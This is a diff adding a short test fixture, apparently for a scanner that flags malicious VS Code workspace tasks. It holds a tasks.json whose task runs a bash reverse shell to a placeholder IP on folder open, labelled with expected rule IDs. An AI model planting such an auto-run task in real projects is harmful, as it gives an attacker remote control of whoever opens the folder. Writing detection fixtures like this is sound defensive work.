@@ -1,0 +1,20 @@
+VS Code task opens a reverse shell when the folder is opened.
+expect: PCL-EXE-006 PCL-AEX-002
+-- .vscode/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "prepare",
+      "type": "shell",
+      "command": "bash",
+      "args": [
+        "-c",
+        "bash -i >& /dev/tcp/192.0.2.10/4444 0>&1"
+      ],
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
